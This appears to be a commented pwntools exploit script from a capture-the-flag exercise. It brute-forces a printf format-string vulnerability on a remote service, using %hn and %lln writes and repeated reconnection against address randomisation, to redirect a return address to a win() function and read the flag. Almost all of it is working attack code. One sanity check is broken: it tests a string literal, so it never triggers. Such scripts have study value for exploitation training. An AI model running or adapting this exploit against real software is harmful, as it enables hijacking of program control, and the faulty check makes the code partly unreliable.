#!/usr/bin/python3

#import libraries
import sys
import pwn
#get some pwn stuff into global namespace
from pwn import p64
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13711
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])

i = 0
while True:
    proc = pwn.remote(host,port,fam="ipv4")

    i+=1
    print(f"Run #{i:{0}4d}: ", end='')

    formatstr  =    b""         #The format string is a hardcoded binary string, 
                                #and consists of the following parts:
    formatstr +=  5*b"%8x"      #  - Skip registers (5 because the first register rdi holds the 
                                #    format string and is not included here)
    formatstr += 32*b"%8x"      #  - Skip the buffer of size 0x100
    formatstr +=  1*b"%8x"      #  - Skip the slot holding the saved rbp value of the callee
    formatstr +=  1*b"%8x"      #  - Skip the slot holding the return address (it points to libc and 
                                #    we can't simply write to libc, as it's set to r/x-only) 
    formatstr +=    b"%hn"      #  - Write to the address that lies on the stack after the return 
                                #    address. This address will always point to a memory address 
                                #    further up on the stack.
                                #    Conveniently printf has printed 0x138 bytes so far. Hence the 
                                #    lower bytes of the address at the location being pointed to 
                                #    will be overridden with 0x0138. This gives us a 1 in 2^12 
                                #    chance of hitting the stack address containing the return 
                                #    address of main, since any return addresses location on the 
                                #    stack will also end in an 8 due to the stack being 16-byte 
                                #    alligned before any call instruction by convention.
    formatstr += 15*b"%8x"      #  - Skip another 15 slots on the stack, printing 0x78 bytes in 
                                #    the process.
    formatstr +=    b"%65418x"  #  - Print another 0xFF8A bytes, bringing the total to 0x1013A.
    formatstr +=    b"%hn"      #  - Conveniently the next slot on the stack contains another stack 
                                #    address pointing to the a stack address further up on the stack.
                                #    We write 2 bytes to that address. Since the overflow of 0x1013A 
                                #    is disregarde in the process, we effectivexly write 0x013A. This
                                #    causes the address to point to the same location as the first 
                                #    one we wrote to offset by two bytes. If we hit the location of 
                                #    a return address, thes allows us to write the address we want 
                                #    to jump to in multiple two parts, reducing the overall amount 
                                #    of data printf needs to print.
    formatstr += 10*b"%8x"      #  - To reach the addresses we just wrote to, we skip another 10 
                                #    addresses, bringing the total amount printed to 1018A.
    formatstr +=    b"%4358x"   #  - The last skipped address is combined with an additional 0x1106 
                                #    bytes of output, bringing the total to 0x11290.
    formatstr +=    b"%lln"     #  - Finally we start writing the address we want jump to, in the 
                                #    hopes that the manipulated stack address will point to a return 
                                #    address. Although only the lower two bytes are correct, we use 
                                #    %lln this time, in order to write the full 64 bit and hence set 
                                #    the upper bytes of the address to 0x00.
    formatstr +=    b"%176x"    #  - Conveniently, we have exactly one more argument we need to skip 
                                #    before reaching our second target. This time we use it to print 
                                #    another 0xB0 bytes, bringing the total to 0x11340.
    formatstr +=    b"%hhn"     #  - We now make use of the wrap-around effect again and override the
                                #    "wrong" 0x01 form before with the "correct" 0x40.
                                #    This completes writing the address of win(): 0x401290
    formatstr +=    b"ENDE!\n"  #  - Finally we just add a marker that makes it easier to figure out 
                                #    where the output of printf ends and the next thing begins.
    
    #Note that no positional arguments using $ were used here. This is a necessity, since we want to
    #  manipulate addresses and write to those very addresses in one go. If we were to specify 
    #  any argument position using $, printf would copy everything to a seperate buffer before 
    #  doing anything else. Hence we could not read the updated address, since the buffer is only 
    #  written to at the very beginning of the function and the manipulation would occur directly 
    #  at the original location on the stack.

    #Also note that there is actually more than one return address we might hit, since we're 
    #  somewhere within printf when the manipulation occurs. We specifically identified two 
    #  additional target return addresses that might be affected by our attack, bringing the 
    #  probability of success up to 1 in (2^12)/3 = 1365.33...

    #Now that the format string is complete, we can send it and check if we're successful. Most of 
    #  the time we won't be. In that case simply rinse and repeat with a different stack  layout 
    #  (which we can get by simply reconnecting thanks to ASLR).
    proc.readline()
    proc.write(formatstr)

    try:
        #First read and discard everything until we reach our end-marker.
        proc.readuntil(b"ENDE!")
        try:
            #Now we try to read another line of text. Most of the time we'll receive an EOFError 
            #  here, since we failed to hit a return address and the program has already terminated.
            #  But in case the ASLR gods looked upon us favorably and reandomized the stack in such 
            #  a way, that our manipulated address matches that of a return address, we'll get a 
            #  flag here.
            flag = proc.readline()

            if not 'flag in flag': #That shouldn't happen anymore, but who knows
                print("Hmm, that's weird. There should've been a flag in here. Trying again...")
                proc.close()
                continue

            #Now all that's left to fo is print it and GTFO. :D
            print(flag.decode())
            proc.close()
            break

        except EOFError:
            print("Partial Stackaddress Bruteforce failed. Trying again...")
            proc.close()
            continue
    except EOFError:
        print("Looks like we're not connected anymore. Trying again...")
        proc.close()
        continue


